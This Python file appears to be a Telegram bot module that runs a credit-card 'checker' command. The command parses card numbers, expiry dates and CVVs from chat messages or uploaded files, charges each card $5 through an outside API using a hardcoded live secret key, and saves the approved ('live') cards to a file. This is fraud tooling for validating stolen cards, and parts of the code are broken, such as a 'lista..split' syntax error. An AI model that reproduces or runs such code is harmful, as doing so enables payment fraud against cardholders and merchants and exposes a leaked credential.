import requests
import concurrent.futures
import time
import json
import re
import os
from pyrogram import Client, filters
from EQUROBOT import app

MAX_RETRIES = 5


def extract_credit_card_details(message_text):
    cards = []
    input = re.findall(r"[0-9]+", message_text)
    
    if not input or len(input) < 3:
        return cards
    
    if len(input) == 3:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2][:2]
            ano = input[2][2:]
            cvv = input[1]
        else:
            mes = input[1][:2]
            ano = input[1][2:]
            cvv = input[2]
    else:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2]
            ano = input[3]
            cvv = input[1]
        else:
            mes = input[1]
            ano = input[2]
            cvv = input[3]

    if len(mes) != 2 or not (1 <= int(mes) <= 12):
        return cards

    if len(cvv) not in [3, 4]:
        return cards

    cards.append(f"{cc}|{mes}|{ano}|{cvv}")
    return cards


# Read the credit card information from the file and convert the format
def read_cc_file(file_path):
    with open(file_path, 'r') as file:
        cc_lines = file.readlines()
    cc_list = []
    for line in cc_lines:
        parts = line.strip().split('|')
        if len(parts[2]) == 2:  # Check if the year is in two-digit format
            parts[2] = '20' + parts[2]
        formatted_cc = ':'.join(parts)
        cc_list.append(formatted_cc)
    return cc_list

# Function to make a single API request and process the response
API_URL = "https://api.mvy.ai/"

def check_cc(lista, amount=5.0, currency="usd"):
    if not lista:
        raise ValueError("Card information (lista) is required.")

    cc = ':'.join(lista..split('|'))
    params = {
        "lista": cc,
        "currency": currency,
        "amount": amount,
        "sk": "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"
    }


    try:
        response = requests.get(API_URL, params=params)
        response_data = response.json()

        if response.status_code != 200:
            raise requests.exceptions.HTTPError(f"HTTP Error: {response.status_code}")

        status = response_data.get('status')
        message = response_data.get('message')

        if status == "approved":
            html_message = response_data.get('html_message', "")
            card_info = response_data.get('card_info', {})
            payment_info = response_data.get('payment_info', {})
            bank_info = response_data.get('bank_info', {})
            rate_limit = response_data.get('rate_limit', {})

            # Example of processing response data
            result = f"Transaction Approved ✅\n"
            result += f"Card: {card_info.get('number', '')}\n"
            result += f"Response: {message}\n"
            result += f"Amount: {payment_info.get('amount', '')} {payment_info.get('currency', '')}\n"
            result += f"Bin Info: {bank_info.get('bin_info', '')}\n"
            result += f"Bank: {bank_info.get('issuing_bank', '')}\n"
            result += f"Country: {bank_info.get('country', '')}\n"
            result += f"Time Taken: {rate_limit.get('time_taken', '')}\n"
            result += f"Vbv: {bank_info.get('vbv', '')}\n"
            result += f"Gateway: {html_message.splitlines()[7].strip()}"

        else:
            result = f"Transaction Failed ❌\nMessage: {message}"

    except requests.exceptions.RequestException as e:
        result = f"Request Exception: {str(e)}"
    
    except json.JSONDecodeError as e:
        result = f"JSON Decode Error: {str(e)}"
    
    except Exception as e:
        result = f"Error: {str(e)}"

    return result

# Save the response to Live.txt if the message is not fraudulent or generic_decline
def save_live_response(cc, message):
    with open('Live.txt', 'a') as file:
        file.write(f"CC: {cc}\n")
        file.write(f"Response: {message} ✅\n\n")

# Handle incoming messages with the /mchk command
@app.on_message(filters.command("cc", prefixes=[".", "/"]))
async def check_cc_command(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc_entry = message.text[command_prefix_length:].strip()

    reply_msg = message.reply_to_message
    if reply_msg:
        if reply_msg.text:
            cc_entries = extract_credit_card_details(reply_msg.text.strip())
            results = [await process_credit_card(entry) for entry in cc_entries]
            await message.reply_text("\n\n".join(results))
        elif reply_msg.document:
            file_path = await app.download_media(reply_msg.document.file_id)
            output_file = f"results_{reply_msg.document.file_name}.txt"
            await process_credit_cards_in_file(file_path, output_file)
            os.remove(file_path)
            await message.reply_document(document=output_file)
            os.remove(output_file)
        else:
            await message.reply_text("Unsupported file type.")
            return

    elif cc_entry:
        cc_entries = cc_entry.split('\n')
        results = [await process_credit_card(entry) for entry in cc_entries]
        await message.reply_text("\n\n".join(results))
    else:
        await message.reply_text("Please provide credit card details or reply to a message containing them.")

# Function to process each credit card entry
async def process_credit_card(entry):
    cc_parts = entry.strip().split('|')
    if len(cc_parts) < 3:
        return f"Invalid credit card entry: {entry}"

    cc = cc_parts[0].strip()
    amount = 5.0  # Set the amount to be charged
    currency = "usd"  # Set the currency (e.g., 'usd')

    return check_cc(cc, amount, currency)

# Function to process credit cards from a file
async def process_credit_cards_in_file(file_path, output_file):
    cc_list = read_cc_file(file_path)
    amount = 5.0  # Set the amount to be charged
    currency = "usd"  # Set the currency (e.g., 'usd')

    results = [check_cc(cc, amount, currency) for cc in cc_list]

    with open(output_file, 'w') as file:
        file.write("\n\n".join(results))
